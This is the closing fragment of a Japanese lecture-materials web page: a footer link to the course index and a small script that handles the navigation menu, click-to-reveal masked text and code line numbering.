      <p><a href="https://takeshiwada1980.github.io/Eii2-2024/">講義資料のIndexに移動</a></p>
    </footer>

    <script>
      window.onload = function () {
        // ナビゲーション関連
        let openBtn = document.getElementsByClassName("openbtn")[0];
        let navPnl = document.getElementById("g-nav");
        openBtn.onclick = () => {
          openBtn.classList.toggle("active");
          navPnl.classList.toggle("panelactive");
        };

        let items = navPnl.getElementsByTagName("a");
        Array.from(items).forEach((item) => {
          item.onclick = () => {
            openBtn.classList.toggle("active");
            navPnl.classList.toggle("panelactive");
          };
        });

        // マスク処理
        let maskedSpans = document.getElementsByClassName("masked");
        Array.from(maskedSpans).forEach((span) => {
          span.onclick = () => {
            span.classList.toggle("open");
          };
        });

        // data-startfrom 属性の行番号カウンタのリセット
        document.querySelectorAll("div.sourceCode").forEach(function (div) {
          var startFrom = div.getAttribute("data-startfrom");
          if (startFrom != null) {
            div.style.counterReset = "pg-line " + (startFrom - 1);
          }
        });

        // 画像にリンクを付与
        // let images = document.querySelectorAll("figure img");
        // Array.from(images).forEach((img) => {
        //   img.onclick = () => {
        //     location.href = img.getAttribute("src");
        //   };
        // });
      };
    </script>
  </body>
</html>
